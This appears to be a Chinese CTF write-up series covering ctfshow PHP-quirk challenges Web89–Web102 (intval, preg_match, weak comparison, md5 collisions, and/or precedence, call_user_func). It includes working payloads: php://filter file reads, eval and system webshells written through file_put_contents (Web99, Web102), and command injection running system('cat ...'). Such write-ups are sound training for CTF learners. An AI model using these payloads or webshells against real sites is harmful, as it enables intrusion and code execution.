# PHP特性

## Web89

题目

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 15:38:51
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


include("flag.php");
highlight_file(__FILE__);

if(isset($_GET['num'])){
    $num = $_GET['num'];
    if(preg_match("/[0-9]/", $num)){
        die("no no no!");
    }
    if(intval($num)){
        echo $flag;
    }
}
```

### intval特性

intval函数特性：intval函数在遇到数组时不判断内容只判断是否为空，空返回0，非空返回1；

![web89_intval](.\image_php\web89_intval.png)

> 以下是 `intval()` 函数的一些基本用法：
>
> 1. **基本转换**：
>
>    php
>
>    ```php
>    $var = "123abc";
>    echo intval($var); // 输出 123
>    ```
>
> 2. **带小数点的字符串**：
>
>    php
>
>    ```php
>    $var = "123.456";
>    echo intval($var); // 输出 123
>    ```
>
> 3. **负数**：
>
>    php
>
>    ```php
>    $var = "-123";
>    echo intval($var); // 输出 -123
>    ```
>
> 4. **布尔值**：
>
>    php
>
>    ```php
>    $var = true;
>    echo intval($var); // 输出 1
>    ```
>
> 5. **空字符串**：
>
>    php
>
>    ```php
>    $var = "";
>    echo intval($var); // 输出 0
>    ```
>
> 6. **数组和对象**：
>
>    php
>
>    ```php
>    $var = array(1, 2, 3);
>    echo intval($var); // 输出 1，因为 intval() 只判断数组是否为空，非空输出1
>
>    $var = new stdClass();
>    $var->number = 123;
>    echo intval($var); // 输出 1，因为 intval() 不能直接处理对象
>    ```
>
> 7. **带基数参数**： `intval()` 函数还可以接受一个可选的第二个参数，即基数（base），用于指定数字的进制。例如，如果你想将一个二进制字符串转换为整数，可以这样做：
>
>    php复制
>
>    ```php
>    $var = "1010";
>    echo intval($var, 2); // 输出 10
>    ```
> 8. **科学计数法**：intval()函数可以处理科学计数发的数字
>
>    ```php
>    $var = "4476e1";
>    echo intval($var); // 输出 4476 intval("4476e1") === 4476
>    ```

### preg_match特性

preg_match当检测的变量是数组的时候会报错并返回0。

根据上述特性传入数组就能绕过payload `?num[]=1`

## Web90

题目：

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 16:06:11
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
```

### 方法一：intval($var,$base)函数基底特性

intval($var,$base)，其中var必填，base可选，这里base=0,则表示根据var开始的数字决定使用的进制：0b或0B使用二进制，0x或0X开头使用十六进制，0开头使用八进制，否则使用十进制。十六进制或者八进制绕过即可。

payload：`/?num=0x117C` `/?num=010574` `/?num=0b0001000101111100`

### 方法二：intval特性绕过

1. 在前面intval用发中说明了intval在处理`数字+字符`的情况时会保留数字payload `/?num=4476abc`（只使用于php 7.1+） 

2. intval在处理浮点数时会取整,用浮点数就能绕过`$num==="4476"` pyaload： `/?num=4476.666`

3. 【< php7.1】intval("4476e1") === 4476 【php 7.1+】`intval("4476e1") === 44760;intval("4476e1",0) === 4476`

   ```php
   <?php
       
   echo intval("4476e1").' ';
   echo intval("4476e1",0).' ';
   ```

   

## Web91：换行解析漏洞

相关[Apache HTTPD 换行解析漏洞(CVE-2017-15715)与拓展-CSDN博客](https://blog.csdn.net/qq_46091464/article/details/108278486)

题目：

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 16:16:09
# @link: https://ctfer.com

*/

show_source(__FILE__);
include('flag.php');
$a=$_GET['cmd'];
if(preg_match('/^php$/im', $a)){
    if(preg_match('/^php$/i', $a)){
        echo 'hacker';
    }
    else{
        echo $flag;
    }
}
else{
    echo 'nonononono';
}
```

这题关键在于正则匹配`'/^php$/im'`和`'/^php$/i'`的区别

> `/^php$/im` 和 `/^php$/i` 的区别在于修饰符 `m` 和 `i` 的使用。
>
> - `i` 修饰符表示“不区分大小写”（case-insensitive），这意味着在匹配时，正则表达式中的字符和目标字符串中的字符的大小写将被忽略。例如，模式中的 `p` 可以匹配目标字符串中的 `P` 或 `p`。
> - `m` 修饰符通常用于多行模式（multiline），它影响 `^` 和 `$` 锚点的行为。在多行模式下，`^` 匹配每一行的开始，`$` 匹配每一行的结束，而不仅仅是整个字符串的开始和结束。
>
> /^php$/i是匹配全部的内容只要是`php`就会匹配成功
>
> /^php$/im是逐行匹配每一行只要有一行为`php`就匹配成功

绕过方式也很简单用换行符就可以payload如下`/?cmd=666%0Aphp`，%0A是换行符\n的url编码格式，也就是/^php$/im会匹配到第二行的php匹配成功了，但是/^php$/i 会匹配整段字符串`666%0Aphp`但是这段字符串不止有`php`还有`666%0A`自然不满足^$头尾匹配

## Web92：php数值弱比较

题目：

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 16:29:30
# @link: https://ctfer.com

*/

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
```

关键在于绕过$num==4476，并实现if(intval($num,0)==4476)

```php
<?php
    highlight_file(__FILE__);
    $num1 = 4476;
    $num2 = '4476';
    $num3 = '4476e1';
    $num4 = '4476aaaa';
    $num5 = '4476.666';
    $num6 = '0x117c';
    $num7 = 0x117c;

    echo ($num1 == $num2 ? 'true' : 'false') . ' ' . $num1 . ' ' . $num2 . "</br>";
    echo ($num1 == $num3 ? 'true' : 'false') . ' ' . $num1 . ' ' . $num3 . "</br>";
    echo ($num1 == $num4 ? 'true' : 'false') . ' ' . $num1 . ' ' . $num4 . "</br>";
    echo ($num1 == $num5 ? 'true' : 'false') . ' ' . $num1 . ' ' . $num5 . "</br>";
    echo ($num1 == $num6 ? 'true' : 'false') . ' ' . $num1 . ' ' . $num6 . "</br>";
    echo ($num1 == $num7 ? 'true' : 'false') . ' ' . $num1 . ' ' . $num7 . "</br>";
?>
```

![web92_compare](.\image_php\web92_compare.png)

通过上面的比较用科学计数，浮点数都可以绕过，另外用之前intval($val,0)的特性用其他进制数也能绕过

payload `/?num=4476e1` `/?num=4476.66` `/?num=0x117C` `/?num=010574` ` /?num=0B0001000101111100`

## Web93

题目：

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 16:32:58
# @link: https://ctfer.com

*/

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
```

比上题多了`if(preg_match("/[a-z]/i", $num))`用八进制或者小数就能绕过

payload `/?num=4476.66` `/?num=010574`

## Web94：strpos($num, "0")

题目

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 16:46:19
# @link: https://ctfer.com

*/

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(!strpos($num, "0")){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
}
```

相比上一题多了if(!strpos($num, "0"))**[开头不能为0，但是必须要有0]**，而且if($num==="4476")是强匹配

> strpos(string,find,start)有三个参数，string是被检查的字符串，find是要被搜索的字符串，start是开始检索的位置
>
> strpos($num, "0")匹配"0"首次出现的位置，如果0出现在第0位，或没有出现0返回false，另外strpos只能处理字符串和整数在处理浮点数时会返回false
>
> 验证strpos特性
>
> ```php
> <?php
> $num1 = 4476;
> $num2 = 01574;
> $num3 = 10574;
> $num4 = '4476.0';
> $num5 = 4476.0;
> echo strpos($num1, "0").'</br>';
> echo strpos($num2, "0").'</br>';
> echo strpos($num3, "0").'</br>';
> echo strpos($num4, "0").'</br>';
> echo strpos($num5, "0").'</br>';
> ```
>
> ![web94](.\image_php\web94.png)

所有这里用浮点数的字符串绕过就行 payload `/?num=4476.0` 此时的strpos($num, "0")为5，将不会进入if(!strpos($num, "0"))

看了其他师傅的payload

```php
 ?num=4476%0a0 //不知道为什么%0a也可以
 ?num=%0A010574 //这里利用了八进制+换行符，将0升至1号位strpos($num, "0")返回1
 ?num=%2b010574 //%2b是+号的url编码，用正号提升0的位置+010574，strpos($num, "0")返回1
```

## Web95：分隔符

题目：

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 16:53:59
# @link: https://ctfer.com

*/

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]|\./i", $num)){
        die("no no no!!");
    }
    if(!strpos($num, "0")){
        die("no no no!!!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
}
```

这里相比上一题使用了弱比较if($num==4476)，不能用4476.0绕过了

使用前面的八进制payload都可以绕过弱比较：

```php
 ?num=%0A010574 //这里利用了八进制+换行符，将0升至1号位strpos($num, "0")返回1
 # 根据上一个payload有一下几种变种
 %0A[换行符\n] %09[tab] %20[空格]
 ?num=%2b010574 //用正号+提升0的位置+010574，strpos($num, "0")返回1
```

## Web96：文件读取时的字符串绕过./|../html/flag.php

题目：

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 19:21:24
# @link: https://ctfer.com

*/


highlight_file(__FILE__);

if(isset($_GET['u'])){
    if($_GET['u']=='flag.php'){
        die("no no no");
    }else{
        highlight_file($_GET['u']);
    }


}
```

payload`/?u=./flag.php` `/?u=/var/www/html/flag.php` `/?u=../html/flag.php`

### 伪协议读取文件

看到有师傅用了filter伪协议读取经过实验下面几个函数都可以用伪协议读取文件

payload：`php://filter/read=convert.base64-encode/resource=flag.php`

```php
<?php
highlight_file(__FILE__);
$u=$_GET['u'];
// highlight_file($u);
show_source($u);
// readfile($u);
// include($u);
// require($u);
// var_dump((new SplFileObject($u))->fpassthru());
// (new SplFileObject($u))->fpassthru();
//$handle = fopen($u, 'r');if ($handle === false) {die('Failed to open file');}while (($line = fgets($handle)) !== false) {echo $line;}if(!fclose($handle)){die('Failed to close file');}
// $contents = file_get_contents($u);echo $contents;
// print_r(file($u));
```



## Web97：md5()函数特性

题目：

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 19:36:32
# @link: https://ctfer.com

*/

include("flag.php");
highlight_file(__FILE__);
if (isset($_POST['a']) and isset($_POST['b'])) {
if ($_POST['a'] != $_POST['b'])
if (md5($_POST['a']) === md5($_POST['b']))
echo $flag;
else
print 'Wrong.';
}
?>
```

这里要使两个变量不相等但是其MD5值相等。

### 思路一：数组绕过

md5()函数在处理数组和对象时会返回null,php数组比较，比较的是键值、顺序、类型。

![web97](.\image_php\web97.png)

### 思路二：两个不用的明文各自经过MD5加密后，得到相等的hash值

Payload：

```php
a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```

生成两个明文不同MD5相同的字符生成使用如下工具

程序：http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip
源码：http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5_source.zip

用法主要就是-p参数和-o,-p指定初始输入文件相当于生成种子，-o指定输出

![web97_fastcoll](.\image_php\web97_fastcoll.png)

`fastcoll_v1.0.0.5.exe -o msg1.bin msg2.bin`生成MD5相同的原始字符

用010edit查看内容不同但是生成的MD5相同

![web97_md5](.\image_php\web97_md5.png)

## Web98：php中http相关的各个环境变量

题目：

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 21:39:27
# @link: https://ctfer.com

*/

include("flag.php");
$_GET?$_GET=&$_POST:'flag';
$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';
$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';
highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);

?>
```

### 方法一

将题目修改下放到本地慢慢调就跳出来了

```php
<?php
$flag = "flag{hello_world}";
// include("flag.php");
var_dump($_GET);
$_GET?$_GET=&$_POST:'flag';
var_dump($_GET);
$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';
var_dump($_GET);
$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';
var_dump($_GET);
echo ($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);
// highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);

?>
```



payload

```http
POST /?a=1 HTTP/1.1
Host: 7c1be959-6209-4a84-ac5b-501cc206d5f7.challenge.ctf.show
Cookie: flag=flag;
FLAG: flag
Cache-Control: max-age=0
Sec-Ch-Ua: "Microsoft Edge";v="129", "Not=A?Brand";v="8", "Chromium";v="129"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://7c1be959-6209-4a84-ac5b-501cc206d5f7.challenge.ctf.show/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Priority: u=0, i
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 9

flag=flag
```

> php中http相关的各个环境变量：
>
> 1. $_GET来自get请求的参数
>
> 2. $_POST来自post请求的参数
>
> 3. $_COOKIE来自cookie中的参数：例如
>
>    ```php
>    Cookie: _ga=GA1.1.742250855.1729494993; _ga_R1FN4KJKJH=GS1.1.1729494993.1.1.1729495564.0.0.0; flag=flag
>    array(3) {
>      ["_ga"]=>
>      string(26) "GA1.1.742250855.1729494993"
>      ["_ga_R1FN4KJKJH"]=>
>      string(37) "GS1.1.1729494993.1.1.1729495564.0.0.0"
>      ["flag"]=>
>      string(4) "flag"
>    }
>    ```
>
> 4. $\_SERVER来自http请求头和服务器系统环境变量中，来自http请求头的变量以[HTTP\_+HTTP头命名]例如：
>
>    ```http
>    POST /test.php?a=1 HTTP/1.1
>    Host: 10.10.10.1
>    Cache-Control: max-age=0
>    Upgrade-Insecure-Requests: 1
>    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0
>    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
>    Accept-Encoding: gzip, deflate, br
>    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
>    Cookie: _ga=GA1.1.742250855.1729494993; _ga_R1FN4KJKJH=GS1.1.1729494993.1.1.1729495564.0.0.0; flag=flag
>    Connection: close
>    FLAG: flag
>    Content-Type: application/x-www-form-urlencoded
>    Content-Length: 9
>                                                                                              
>    flag=flag
>    
>    
>    array(43) {
>      ["PATH"]=>
>      string(1525) "...服务器系统path..."
>      ["SYSTEMROOT"]=>
>      string(10) "C:\WINDOWS"
>      ["COMSPEC"]=>
>      string(27) "C:\WINDOWS\system32\cmd.exe"
>      ["PATHEXT"]=>
>      string(53) ".COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC"
>      ["WINDIR"]=>
>      string(10) "C:\WINDOWS"
>      ["SCRIPT_FILENAME"]=>
>      string(28) "E:/phpstudy_pro/WWW/test.php"
>      ["SERVER_ADMIN"]=>
>      string(17) "admin@example.com"
>      ["CONTEXT_DOCUMENT_ROOT"]=>
>      string(19) "E:/phpstudy_pro/WWW"
>      ["CONTEXT_PREFIX"]=>
>      string(0) ""
>      ["REQUEST_SCHEME"]=>
>      string(4) "http"
>      ["DOCUMENT_ROOT"]=>
>      string(19) "E:/phpstudy_pro/WWW"
>      ["REMOTE_ADDR"]=>
>      string(10) "10.10.10.1"
>      ["SERVER_PORT"]=>
>      string(2) "80"
>      ["SERVER_ADDR"]=>
>      string(10) "10.10.10.1"
>      ["SERVER_NAME"]=>
>      string(10) "10.10.10.1"
>      ["SERVER_SOFTWARE"]=>
>      string(73) "Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02"
>      ["SERVER_SIGNATURE"]=>
>      string(0) ""
>      ["SystemRoot"]=>
>      string(10) "C:\WINDOWS"
>      ["CONTENT_LENGTH"]=>
>      string(1) "9"
>      ["CONTENT_TYPE"]=>
>      string(33) "application/x-www-form-urlencoded"
>      ["HTTP_FLAG"]=>
>      string(4) "flag"
>      ["HTTP_CONNECTION"]=>
>      string(5) "close"
>      ["HTTP_COOKIE"]=>
>      string(95) "_ga=GA1.1.742250855.1729494993; _ga_R1FN4KJKJH=GS1.1.1729494993.1.1.1729495564.0.0.0; flag=flag"
>      ["HTTP_ACCEPT_LANGUAGE"]=>
>      string(47) "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6"
>      ["HTTP_ACCEPT_ENCODING"]=>
>      string(17) "gzip, deflate, br"
>      ["HTTP_ACCEPT"]=>
>      string(135) "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
>      ["HTTP_USER_AGENT"]=>
>      string(125) "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0"
>      ["HTTP_UPGRADE_INSECURE_REQUESTS"]=>
>      string(1) "1"
>      ["HTTP_CACHE_CONTROL"]=>
>      string(9) "max-age=0"
>      ["HTTP_HOST"]=>
>      string(10) "10.10.10.1"
>      ["FCGI_ROLE"]=>
>      string(9) "RESPONDER"
>      ["PHP_SELF"]=>
>      string(9) "/test.php"
>      ["REQUEST_TIME_FLOAT"]=>
>      float(1729864439.6001)
>      ["REQUEST_TIME"]=>
>      int(1729864439)
>    }
>    ```
>
>    

### 方法二

看了下paylaod发现想复杂了，这里最后读取的是`highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);`而前面判断的是$\_GET['flag']，而$\_GET来自于$\_POST所以只要传入post：HTTP_FLAG=flag即可



## Web99

题目

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 22:36:12
# @link: https://ctfer.com

*/

highlight_file(__FILE__);
$allow = array();
for ($i=36; $i < 0x36d; $i++) { 
    array_push($allow, rand(1,$i));
}
if(isset($_GET['n']) && in_array($_GET['n'], $allow)){
    file_put_contents($_GET['n'], $_POST['content']);
}

?>
```

//in_array()函数有漏洞 没有设置第三个参数 就可以形成自动转换eg:n=1.php自动转换为1

file_put_contents($\_GET['n'], $\_POST['content']);用于向$\_GET['n']文件写入内容$\_POST['content']。

只要写入webshell就能执行命令找flag

payload`get：?n=1.php post：content=<?php eval($_GET['CMD']);?>`

这样就可以创建命为1.php的webshell

命令执行`/1.php?cmd=system("ls");` `/1.php?cmd=system("nl%20flag36d.php");`



## Web100：php中的and和&&

题目：

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-21 22:10:28
# @link: https://ctfer.com

*/

highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\;/", $v2)){
        if(preg_match("/\;/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }
    
}


?>
```

is_numeric()检查v1v2v3是否为数字或数字字符串，然后匹配v2中不能有`;`，v3中必须有`;`，才能进入eval函数执行命令

这里看似没有办法向eval函数写入其他要执行的函数，v1v2v3只能为数字，但是这里用了and做连接词，`$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);` php中and的特性是如果遇到false则只判断false以前的bool值：也就是 1 and 0为true，0 and 1为false，以下面为例子：

### php中的and与&&

```php
<?php
	$v0= true and  false and false;
	$v1= false and true and false;
	$v2= true && false && false;
	var_dump($v0);
	var_dump($v1);
	var_dump($v2);
?>

// 输出
-->	bool(true)
    bool(false)
    bool(false)
```

由于这一题是`$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);`

所以只要$v1为数字即可，就可以用v2v3来构造payload,要使`eval("$v2('ctfshow')$v3");`能执行我们想要的函数，将('ctfshow')注释掉即可，另外v2中不能有`;`v3中必须有`;`这样直接构造如下payload即可：

payload:`/?v1=1&v2=system('cat ctfshow.php')/*&v3=*/;`

![web100flag](.\image_php\web100flag.png)

得到flag `b5a6cbd70x2d340c0x2d41450x2db3290x2db0bd15059f22` 这里出现0x2d直接将0x2d转换成字符后发现是`-`替换后得到`b5a6cbd7-340c-4145-b329-b0bd15059f22`提交`ctfshow{b5a6cbd7-340c-4145-b329-b0bd15059f22}`通过

### is_numeric()

> is_numeric()用于检查一个变量是否是数字或数字字符串，如果变量是数字或者是数字字符串（即可以转换为数字的字符串），函数返回 `true`；否则返回 `false`。
>
> #### 基本语法
>
> php
>
> ```php
> bool is_numeric ( mixed $value )
> ```
>
> - `$value`：要检查的值。
>
> #### 示例
>
> php
>
> ```php
> $var1 = 10;
> $var2 = "10";
> $var3 = "10.5";
> $var4 = "hello";
> 
> if (is_numeric($var1)) {
>     echo "var1 is numeric";
> } else {
>     echo "var1 is not numeric";
> }
> 
> if (is_numeric($var2)) {
>     echo "var2 is numeric";
> } else {
>     echo "var2 is not numeric";
> }
> 
> if (is_numeric($var3)) {
>     echo "var3 is numeric";
> } else {
>     echo "var3 is not numeric";
> }
> 
> if (is_numeric($var4)) {
>     echo "var4 is numeric";
> } else {
>     echo "var4 is not numeric";
> }
> ```
>
> #### 输出
>
> ```text
> var1 is numeric
> var2 is numeric
> var3 is numeric
> var4 is not numeric
> ```
>
> #### 注意事项
>
> 1. **字符串中的数字**：`is_numeric()` 会检查字符串是否为数字字符串，即使字符串中包含非数字字符，只要这些非数字字符不影响字符串转换为数字，函数也会返回 `true`。例如，`"123abc"` 和 `"123.45.6"` 都会返回 `false`，因为它们不能被转换为有效的数字。
> 2. **空字符串**：空字符串（`""`）会返回 `false`。
> 3. **科学记数法**：`is_numeric()` 可以正确识别科学记数法表示的数字字符串，例如 `"1e10"`。
> 4. **布尔值**：布尔值 `true` 和 `false` 分别被视为 `1` 和 `0`，因此 `is_numeric(true)` 和 `is_numeric(false)` 都会返回 `true`。
>
> `is_numeric()` 函数在处理用户输入和数据验证时非常有用，可以帮助你确保变量是数值类型，从而避免在后续的数值运算中出现错误。

## 方法二：类反射

payload`/?v1=1&v2=echo+new+ReflectionClass&v3=;`

## Web101

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-22 00:26:48
# @link: https://ctfer.com

*/

highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\;|\?|[0-9]/", $v2)){
        if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\?|[0-9]/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }
    
}

?>
```

这题使用上面类反射的方法

payload：`/?v1=1&v2=echo%20new%20ReflectionClass&v3=;`

不过这里题目flag最后一组少给了一位要爆破flag

ctfshow{1beedc69-683f-4a15-b7e5-88484f8d249a}

## Web102：精华

题目：

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: atao
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-23 20:59:43

*/


highlight_file(__FILE__);
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    file_put_contents($v3,$str);
}
else{
    die('hacker');
}


?>
```

**题目解析**

- $v4 = is_numeric($v2) and is_numeric($v3);检验v2，v3是否是数字或数字字符串，and可以用前面的web100的方法绕过，但是v2必须是数字
- call_user_func()是回调函数，`call_user_func($v1, $s)` 调用 `$v1` 指定的函数，并将 `$s` 作为参数传递给这个函数。
- file_put_contents($v3,$str); 写入文件，可以用于新建webshell文件

**思路**

由于v2必须是数字，所以想到用数字构造webshell，想到函数hex2bin将数字转换成字符串，所以要构造转换成hex后全是数字的webshell，这里思路是用base64编码后的字符转换成hex（这样降低了特殊字符在转换成hex是带有字母有字母is_numeric识别就是false，能降低的原因是base64的编码字符只有[0-9]\[a-z]\[A-Z]+=），构造不同的webshellbase64编码后如果打印true就能过is_numeric了。最后试出来webshell为

```php
<?php `$_GET[ab]`;
// base64 -> PD9waHAgYCRfR0VUW2FiXWA7
// hex -> 504439776148416759435266523056555732466958574137
```

调试代码：

```php
<?php 
	$A = 'PD9waHAgYCRfR0VUW2FiXWA7';
	$B = bin2hex($A);
	echo $B.'<br>';
	var_dump(is_numeric(bin2hex($A)));
	echo (hex2bin($B));
	echo base64_decode(hex2bin($B));
?>
```

payload构造：注意由于substr($v2,2);所以v2在前面构造的hex上还要再前面加两个数字，这里加11，另外由于使用了base64编码所以这里要用filter，将输入的文件流base64解码所以得到`v3=php://filter/write=convert.base64-decode/resource=1.php`

```http
POST /?v2=11504439776148416759435266523056555732466958574137&v3=php://filter/write=convert.base64-decode/resource=1.php HTTP/1.1
Host: bd6baa0c-f110-4e42-9599-a402c04fa980.challenge.ctf.show
Content-Length: 10
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="130", "Microsoft Edge";v="130", "Not?A_Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Origin: https://bd6baa0c-f110-4e42-9599-a402c04fa980.challenge.ctf.show
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://ctf.show/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Priority: u=0, i
Connection: close

v1=hex2bin
```

```
# 虽然上面的webshell可以写入并执行但是没有回现，所以在这个webshell下再新建一个webshell 2.php
/1.php?ab=echo%20%27<?php%20system($_GET[cmd]);%27>2.php
# 在webshell 2.php中执行命令
/2.php?cmd=cat%20flag.php
```

![web102flag](.\image_php\web102flag.png)

### 回调函数call_user_func()

> 在 PHP 中，`call_user_func()` 函数用于调用一个回调函数，这个回调函数可以是一个简单的函数名、一个对象加方法的数组，或者是一个闭包。`call_user_func()` 接受一个回调函数作为第一个参数，后面跟着该回调函数所需的参数。
>
